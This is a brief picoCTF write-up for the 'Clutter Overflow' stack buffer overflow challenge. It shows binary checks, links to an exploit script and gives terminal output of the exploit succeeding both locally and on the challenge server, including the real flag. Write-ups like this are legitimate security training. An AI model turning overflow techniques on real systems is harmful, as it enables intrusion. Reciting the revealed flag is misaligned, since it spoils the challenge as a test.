### Clutter Overflow PicoCTF

### Binary Exploitation

### Basic File Checks

```
──(mark㉿haxor)-[~/Desktop/CTF/Pico/clutter-overflow]
└─$ file chall    
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=181b4752cc92cfa231c45fe56676612e0ded947a, not stripped
                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/Desktop/CTF/Pico/clutter-overflow]
└─$ checksec chall
[*] '/home/mark/Desktop/CTF/Pico/clutter-overflow/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Source code is given [Source](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/picoctf/clutteroverflow/clutteroverflow.c)

My exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/picoctf/clutteroverflow/exploit.py)

Running it locally works

```
└─$ python3 exploit.py
[+] Starting local process './chall': pid 95859
[+] Receiving all data: Done (101B)
[*] Process './chall' stopped with exit code 0 (pid 95859)
[+] 
    code == 0xdeadbeef: how did that happen??
    take a flag for your troubles
    flag{fake_flag_for_testing}
```

I'll run it on the remote server

```
└─$ python3 exploit.py REMOTE mars.picoctf.net 31890
[+] Opening connection to mars.picoctf.net on port 31890: Done
[+] Receiving all data: Done (114B)
[*] Closed connection to mars.picoctf.net port 31890
[+] 
    code == 0xdeadbeef: how did that happen??
    take a flag for your troubles
    picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

